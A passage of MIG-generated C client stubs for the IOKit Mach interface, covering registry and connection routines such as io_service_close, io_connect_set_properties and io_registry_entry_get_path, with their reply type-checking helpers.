		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->planeCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2814;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2814, "io_registry_entry_get_parent_iterator")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2814, "io_registry_entry_get_parent_iterator")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_parent_iterator_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_parent_iterator_t((__Reply__io_registry_entry_get_parent_iterator_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_parent_iterator_t__defined) */

	*iterator = Out0P->iterator.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_close_t__defined)
#define __MIG_check__Reply__io_service_close_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_close_t(__Reply__io_service_close_t *Out0P)
{

	typedef __Reply__io_service_close_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2916) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_service_close_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_close */
mig_external kern_return_t io_service_close
(
	mach_port_t connection
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_service_close_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_close_t__defined */

	__DeclareSendRpc(2816, "io_service_close")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = connection;
	InP->Head.msgh_id = 2816;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2816, "io_service_close")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2816, "io_service_close")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_close_t__defined)
	check_result = __MIG_check__Reply__io_service_close_t((__Reply__io_service_close_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_close_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_connect_get_service_t__defined)
#define __MIG_check__Reply__io_connect_get_service_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_connect_get_service_t(__Reply__io_connect_get_service_t *Out0P)
{

	typedef __Reply__io_connect_get_service_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2917) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->service.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->service.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_connect_get_service_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_connect_get_service */
mig_external kern_return_t io_connect_get_service
(
	mach_port_t connection,
	mach_port_t *service
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t service;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_connect_get_service_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_connect_get_service_t__defined */

	__DeclareSendRpc(2817, "io_connect_get_service")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = connection;
	InP->Head.msgh_id = 2817;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2817, "io_connect_get_service")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2817, "io_connect_get_service")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_connect_get_service_t__defined)
	check_result = __MIG_check__Reply__io_connect_get_service_t((__Reply__io_connect_get_service_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_connect_get_service_t__defined) */

	*service = Out0P->service.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_connect_add_client_t__defined)
#define __MIG_check__Reply__io_connect_add_client_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_connect_add_client_t(__Reply__io_connect_add_client_t *Out0P)
{

	typedef __Reply__io_connect_add_client_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2920) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_connect_add_client_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_connect_add_client */
mig_external kern_return_t io_connect_add_client
(
	mach_port_t connection,
	mach_port_t connect_to
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t connect_to;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_connect_add_client_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_connect_add_client_t__defined */

	__DeclareSendRpc(2820, "io_connect_add_client")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t connect_toTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->connect_to = connect_toTemplate;
	InP->connect_to.name = connect_to;
#else	/* UseStaticTemplates */
	InP->connect_to.name = connect_to;
	InP->connect_to.disposition = 19;
	InP->connect_to.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = connection;
	InP->Head.msgh_id = 2820;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2820, "io_connect_add_client")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2820, "io_connect_add_client")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_connect_add_client_t__defined)
	check_result = __MIG_check__Reply__io_connect_add_client_t((__Reply__io_connect_add_client_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_connect_add_client_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_connect_set_properties_t__defined)
#define __MIG_check__Reply__io_connect_set_properties_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_connect_set_properties_t(__Reply__io_connect_set_properties_t *Out0P)
{

	typedef __Reply__io_connect_set_properties_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2921) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_connect_set_properties_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_connect_set_properties */
mig_external kern_return_t io_connect_set_properties
(
	mach_port_t connection,
	io_buf_ptr_t properties,
	mach_msg_type_number_t propertiesCnt,
	kern_return_t *result
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_connect_set_properties_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_connect_set_properties_t__defined */

	__DeclareSendRpc(2821, "io_connect_set_properties")

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t propertiesTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_PHYSICAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->properties = propertiesTemplate;
	InP->properties.address = (void *)(properties);
	InP->properties.size = propertiesCnt;
#else	/* UseStaticTemplates */
	InP->properties.address = (void *)(properties);
	InP->properties.size = propertiesCnt;
	InP->properties.deallocate =  FALSE;
	InP->properties.copy = MACH_MSG_PHYSICAL_COPY;
	InP->properties.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->propertiesCnt = propertiesCnt;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = connection;
	InP->Head.msgh_id = 2821;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2821, "io_connect_set_properties")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2821, "io_connect_set_properties")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_connect_set_properties_t__defined)
	check_result = __MIG_check__Reply__io_connect_set_properties_t((__Reply__io_connect_set_properties_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_connect_set_properties_t__defined) */

	*result = Out0P->result;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_path_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_path_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_path_t(__Reply__io_registry_entry_get_path_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_path_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 2926) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 512)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->pathCnt > 512 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 512))< Out0P->pathCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 512) + _WALIGN_(Out0P->pathCnt)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_path_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_path */
mig_external kern_return_t io_registry_entry_get_path
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_string_t path
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t pathOffset; /* MiG doesn't use it */
		mach_msg_type_number_t pathCnt;
		char path[512];
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t pathOffset; /* MiG doesn't use it */
		mach_msg_type_number_t pathCnt;
		char path[512];
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_registry_entry_get_path_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_path_t__defined */

	__DeclareSendRpc(2826, "io_registry_entry_get_path")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->planeCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2826;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2826, "io_registry_entry_get_path")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2826, "io_registry_entry_get_path")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_path_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_path_t((__Reply__io_registry_entry_get_path_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_path_t__defined) */

	(void) mig_strncpy(path, Out0P->path, 512);

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_get_root_entry_t__defined)
#define __MIG_check__Reply__io_registry_get_root_entry_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_get_root_entry_t(__Reply__io_registry_get_root_entry_t *Out0P)
{

	typedef __Reply__io_registry_get_root_entry_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2927) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->root.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->root.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_get_root_entry_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_get_root_entry */
mig_external kern_return_t io_registry_get_root_entry
(
	mach_port_t master_port,
	mach_port_t *root
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
